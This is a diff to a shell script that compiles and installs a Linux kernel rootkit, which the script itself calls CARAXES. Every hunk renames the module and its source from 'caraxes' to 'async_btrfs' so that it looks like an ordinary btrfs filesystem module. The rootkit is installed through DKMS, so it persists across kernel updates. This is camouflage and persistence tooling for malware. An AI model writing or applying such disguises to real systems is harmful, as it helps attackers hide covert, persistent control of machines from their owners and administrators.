@@ -166,18 +166,18 @@ compile_rootkit() {
         exit 1
     fi
     
-    if [ ! -f "caraxes.c" ]; then
-        print_error "caraxes.c not found in current directory"
+    if [ ! -f "async_btrfs.c" ]; then
+        print_error "async_btrfs.c not found in current directory"
         exit 1
     fi
     
     # Compile
     make
     
-    if [ -f "caraxes.ko" ]; then
-        print_success "Compilation successful! caraxes.ko created."
+    if [ -f "async_btrfs.ko" ]; then
+        print_success "Compilation successful! async_btrfs.ko created."
     else
-        print_error "Compilation failed. caraxes.ko not found."
+        print_error "Compilation failed. async_btrfs.ko not found."
         exit 1
     fi
 }
@@ -203,7 +203,7 @@ install_module_dkms() {
     sudo tee "$DKMS_DIR/dkms.conf" > /dev/null <<EOF
 PACKAGE_NAME="${MODULE_NAME}"
 PACKAGE_VERSION="${MODULE_VERSION}"
-BUILT_MODULE_NAME[0]="caraxes"
+BUILT_MODULE_NAME[0]="${MODULE_NAME}"
 BUILT_MODULE_LOCATION[0]="."
 DEST_MODULE_NAME[0]="${MODULE_NAME}"
 DEST_MODULE_LOCATION[0]="/updates/dkms"
@@ -257,9 +257,9 @@ EOF
 
 
 # Check if we're in the right directory
-if [ ! -f "caraxes.c" ] || [ ! -f "Makefile" ]; then
+if [ ! -f "async_btrfs.c" ] || [ ! -f "Makefile" ]; then
     print_error "Please run this script from the CARAXES rootkit directory"
-    print_error "Required files: caraxes.c, Makefile"
+    print_error "Required files: async_btrfs.c, Makefile"
     exit 1
 fi
 
